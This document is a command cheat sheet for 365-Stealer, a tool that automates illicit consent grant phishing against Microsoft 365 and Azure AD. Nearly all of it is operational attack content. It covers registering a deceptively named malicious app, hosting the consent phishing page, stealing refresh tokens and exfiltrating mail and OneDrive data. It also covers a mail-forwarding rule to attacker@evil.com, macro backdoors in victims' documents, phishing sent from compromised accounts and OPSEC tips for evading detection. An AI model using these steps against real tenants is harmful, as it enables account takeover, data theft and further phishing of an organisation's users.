# 365-Stealer

**Type:** Python3 Tool with Web UI
**Purpose:** Automate illicit consent grant attacks against Azure AD/Microsoft 365
**Platform:** Windows (XAMPP), Linux
**Tags:** #azure #m365 #python #phishing #consent-grant #initial-access #persistence #exfiltration

---

## Installation & Setup

```bash
# Clone repository
git clone https://github.com/AlteredSecurity/365-Stealer.git
cd 365-Stealer

# Install dependencies
pip install -r requirements.txt

# For web UI (Windows with XAMPP)
# Copy to C:\xampp\htdocs\365-Stealer
# Follow yoursVictims/Readme.md for database setup
```

---

## Quick Reference (Most Common Commands)

```bash
# Automated Azure app registration
python 365-Stealer.py --app-registration

# Set configuration
python 365-Stealer.py --set-config

# Host phishing application
python 365-Stealer.py --run-app

# Steal with authorization code
python 365-Stealer.py --code <auth-code>

# Steal only tokens (no data exfiltration)
python 365-Stealer.py --code <auth-code> --no-stealing

# Refresh all user data
python 365-Stealer.py --refresh-all
```

---

## INITIAL-ACCESS: App Registration & Setup

### INITIAL-ACCESS: Automated App Registration
**Use Case:** Quickly register malicious Azure application

```bash
# Automated registration (interactive)
python 365-Stealer.py --app-registration

# Prompts for:
# - Azure Tenant ID
# - Application name
# - Redirect URI
# - Authentication method (OAuth/Device Code)
# - API permissions (default/LowImpact/custom)
```

### INITIAL-ACCESS: Manual App Registration
**Use Case:** Manual control over app registration

```
1. Login to https://portal.azure.com
2. Navigate to Microsoft Entra ID → App registrations
3. Click "New registration"
4. Name: Choose convincing name (e.g., "Microsoft Security Update")
5. Account types: "Accounts in any organizational directory (Multitenant)"
6. Redirect URI: https://<YOUR-DOMAIN>:<PORT>/login/authorized
7. Click "Register"
```

### INITIAL-ACCESS: Configure App Permissions
**Use Case:** Set delegated permissions for the malicious app

**Required Delegated Permissions:**
- Contacts.Read
- Mail.Read
- Notes.Read.All
- MailboxSettings.ReadWrite
- Files.ReadWrite.All
- Mail.Send
- User.ReadBasic.All

```
1. Go to API permissions → Add a permission
2. Select Microsoft Graph → Delegated permissions
3. Add the permissions listed above
4. Create client secret: Certificates & secrets → New client secret
```

### INITIAL-ACCESS: Configure 365-Stealer
**Use Case:** Set up tool configuration

```bash
# Interactive configuration
python 365-Stealer.py --set-config

# Get current configuration
python 365-Stealer.py --get-config

# Manual config options
--client-id CLIENT_ID
--client-secret CLIENT_SECRET
--redirect-url REDIRECT_URL
--database-path DATABASE_PATH
```

---

## INITIAL-ACCESS: Phishing Campaign

### INITIAL-ACCESS: Host Phishing Application
**Use Case:** Deploy consent phishing page

```bash
# Host with HTTPS (default port 443)
python 365-Stealer.py --run-app

# Host with HTTP (port 80)
python 365-Stealer.py --run-app --no-ssl

# Custom port
python 365-Stealer.py --run-app --port 8443

# Disable access logs (stealth)
python 365-Stealer.py --run-app --disable-logs
```

### INITIAL-ACCESS: Phishing URL Format
**Use Case:** Generate consent URL for victims

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<YOUR-CLIENT-ID>
  &response_type=code
  &redirect_uri=https://<YOUR-DOMAIN>/login/authorized
  &scope=openid%20profile%20offline_access%20Mail.Read%20Files.ReadWrite.All
```

---

## CRED: Token Theft & Management

### CRED: Steal Tokens from Authorization Code
**Use Case:** Convert auth code to refresh token

```bash
# Full data theft
python 365-Stealer.py --code <authorization-code>

# Steal only tokens (no exfiltration)
python 365-Stealer.py --code <auth-code> --no-stealing

# Specify redirect URL
python 365-Stealer.py --code <auth-code> --redirect-url https://your-site.com/callback
```

### CRED: Generate Access Tokens from Refresh Token
**Use Case:** Create new access tokens from stolen refresh token

```bash
# Using refresh token
python 365-Stealer.py --refresh-token <refresh-token> --client-id <client-id> --client-secret <client-secret>

# From token file
python 365-Stealer.py --token-path /path/to/token.json
```

### CRED: Refresh Stolen User Data
**Use Case:** Re-steal data from already compromised users

```bash
# Refresh all users
python 365-Stealer.py --refresh-all

# Refresh specific user
python 365-Stealer.py --refresh-user victim@company.com
```

---

## EXFIL: Data Exfiltration

### EXFIL: Selective Data Theft
**Use Case:** Steal specific types of data

```bash
# List users only
python 365-Stealer.py --code <auth-code> --custom-steal listusers

# Check license information
python 365-Stealer.py --code <auth-code> --custom-steal checklicence

# Steal emails only
python 365-Stealer.py --code <auth-code> --custom-steal outlook

# Steal OneDrive files only
python 365-Stealer.py --code <auth-code> --custom-steal onedrive

# Steal OneNote data
python 365-Stealer.py --code <auth-code> --custom-steal onenote

# Multiple sources
python 365-Stealer.py --code <auth-code> --custom-steal outlook onedrive onenote

# Add delay between requests (OPSEC)
python 365-Stealer.py --code <auth-code> --custom-steal outlook --delay 5
```

### EXFIL: Full Data Exfiltration
**Use Case:** Steal all accessible data

```bash
# Steal everything with default rate
python 365-Stealer.py --code <authorization-code>

# Steal with delay (anti-detection)
python 365-Stealer.py --code <auth-code> --delay 10
```

---

## PERSIST: Persistence Mechanisms

### PERSIST: Create Malicious Outlook Rules
**Use Case:** Forward emails to attacker-controlled address

```bash
# Create rules from JSON file
python 365-Stealer.py --create-rules rules.json --token <access-token>
```

**Example rules.json:**
```json
{
  "displayName": "Forward All Mail",
  "sequence": 1,
  "isEnabled": true,
  "conditions": {
    "subjectContains": []
  },
  "actions": {
    "forwardTo": [
      {
        "emailAddress": {
          "address": "attacker@evil.com"
        }
      }
    ],
    "stopProcessingRules": true
  }
}
```

### PERSIST: Backdoor OneDrive Documents
**Use Case:** Inject macros into .docx files

```bash
# Enable macro injection when stealing
python 365-Stealer.py --code <auth-code> --injection

# Backdoors .docx files with macros and converts to .doc
```

---

## EXEC: Post-Exploitation Actions

### EXEC: Send Email as Victim
**Use Case:** Send phishing emails from compromised account

```bash
# Send email from JSON file
python 365-Stealer.py --send-mail email.json --token <access-token>
```

**Example email.json:**
```json
{
  "message": {
    "subject": "Urgent: Password Reset Required",
    "body": {
      "contentType": "HTML",
      "content": "<h1>Click here to reset password</h1>"
    },
    "toRecipients": [
      {
        "emailAddress": {
          "address": "target@company.com"
        }
      }
    ]
  },
  "saveToSentItems": "false"
}
```

### EXEC: Upload Files to Victim's OneDrive
**Use Case:** Plant malicious files or backdoors

```bash
# Upload file to OneDrive
python 365-Stealer.py --upload /path/to/malicious.exe --token <access-token>

# Upload with token file
python 365-Stealer.py --upload payload.docm --token-path ./tokens/victim.json
```

---

## Database & Data Management

### View Stolen Data via Web UI
**Use Case:** Browse exfiltrated data

```
# Access management portal
http://localhost/365-Stealer/yoursVictims/

# Features:
- View stolen tokens
- Browse emails with search/filter
- Download OneDrive files
- Export user data to CSV
- Manage multiple victims
```

### Delete Data from Database
**Use Case:** Clean up after operation

```bash
# Delete all data
python 365-Stealer.py --delete-all-data

# Delete specific user data
python 365-Stealer.py --delete-user-data victim@company.com
```

### Share Database with Team
**Use Case:** Collaborate on compromised data

```
# database.db file contains:
- Refresh tokens
- Access tokens
- Stolen emails
- OneDrive files
- User information

# Copy database.db to share with team
```

---

## Attack Patterns

### Pattern: Initial Consent Grant → Full Data Theft
```bash
# 1. Register malicious app
python 365-Stealer.py --app-registration

# 2. Host phishing page
python 365-Stealer.py --run-app

# 3. Send phishing link to victims
# (Social engineering via email/Teams/SMS)

# 4. When victim grants consent, steal everything
python 365-Stealer.py --code <auth-code-from-callback>

# 5. Access stolen data
# Open http://localhost/365-Stealer/yoursVictims/
```

### Pattern: Token-Only Theft → Delayed Exploitation
```bash
# 1. Host phishing app
python 365-Stealer.py --run-app

# 2. Steal only tokens initially (stealth)
python 365-Stealer.py --code <auth-code> --no-stealing

# 3. Later, exfiltrate data with delays
python 365-Stealer.py --refresh-user victim@company.com --delay 30 --custom-steal outlook onedrive
```

### Pattern: Persistence via Email Rules
```bash
# 1. Get initial access
python 365-Stealer.py --code <auth-code> --no-stealing

# 2. Create forwarding rule
python 365-Stealer.py --create-rules forward-all.json --token-path ./tokens/victim.json

# 3. Tokens expire after 90 days, but forwarding persists
# Monitor attacker@evil.com for forwarded emails
```

### Pattern: Lateral Movement via Sent Email
```bash
# 1. Compromise initial victim
python 365-Stealer.py --code <auth-code>

# 2. Send phishing to colleagues from victim's account
python 365-Stealer.py --send-mail internal-phish.json --token-path ./victim1.json

# 3. Compromise additional users
python 365-Stealer.py --code <victim2-auth-code>
```

---

## Pro Tips

💡 **Refresh Token Lifetime**: Tokens valid for 90+ days - long-term access
💡 **No Credential Needed**: Bypasses password authentication entirely
💡 **Multi-Tenant Apps**: Can compromise users from ANY Azure AD tenant
💡 **Application Names**: Use convincing names like "Microsoft Security Update" or "Office 365 Admin Tools"
💡 **Delay Requests**: Use `--delay` flag to avoid rate limiting and detection
💡 **Email Rules**: More persistent than tokens, harder to detect
💡 **Database Sharing**: Share database.db with team to leverage same compromised tokens
💡 **Macro Injection**: `--injection` flag backdoors .docx files automatically
💡 **Custom Permissions**: Request only what you need to reduce suspicion during consent
💡 **Web UI**: Management portal easier for browsing large amounts of stolen data

---

## OPSEC Considerations

⚠️ **High Risk:**
- Hosting phishing page on suspicious domains
- Requesting excessive API permissions (use LowImpact preset)
- Rapid data exfiltration without delays
- Exposing management portal to internet

⚠️ **Medium Risk:**
- Creating Outlook rules (generates audit logs)
- Sending emails from compromised accounts
- Uploading files to OneDrive

✅ **Lower Risk:**
- Using `--no-stealing` initially (only tokens)
- Adding delays with `--delay` flag
- Using realistic application names
- Requesting minimal permissions
- Selective data theft with `--custom-steal`

**Access Restrictions:**
- NEVER expose management portal directly to internet
- Use IP whitelisting (enabled by default for localhost)
- Restrict access to controlled infrastructure only

---

## Configuration Files

### Management Portal Configuration
**Location:** `C:/xampp/htdocs/365-Stealer/yourvictims/index.php`

```php
// Modify paths for your environment
$pythonPath = "C:/Python/python.exe";  // or python3
$scriptPath = "C:/xampp/htdocs/365-Stealer/365-Stealer.py";
$databasePath = "C:/xampp/htdocs/365-Stealer/database.db";

// IP Whitelisting
$enableIpWhiteList = true;
$allowedIPs = array('127.0.0.1', 'YOUR-IP-HERE');
```

### Apache Configuration (XAMPP)
**Enable SQLite3:**
```ini
# In php.ini, uncomment:
extension=sqlite3
```

---

## Key Features Reference

**Steals:**
- Refresh tokens (90+ day validity)
- Emails (all folders, with attachments)
- OneDrive files
- OneNote notebooks
- Contact lists

**Actions:**
- Send emails on behalf of victim
- Create malicious Outlook rules
- Upload files to victim's OneDrive
- Backdoor .docx files with macros
- Request new access tokens

**Management:**
- Web UI for browsing stolen data
- Search and filter emails
- Export user data to CSV
- Database sharing with team
- Selective data theft options

---

## Resources

- GitHub: https://github.com/AlteredSecurity/365-Stealer
- Blog: https://www.alteredsecurity.com/post/introduction-to-365-stealer
- Latest Blog (2025): https://www.alteredsecurity.com/post/initial-access-attack-in-azure-understanding-and-executing-the-illicit-consent-grant-attack-in-202
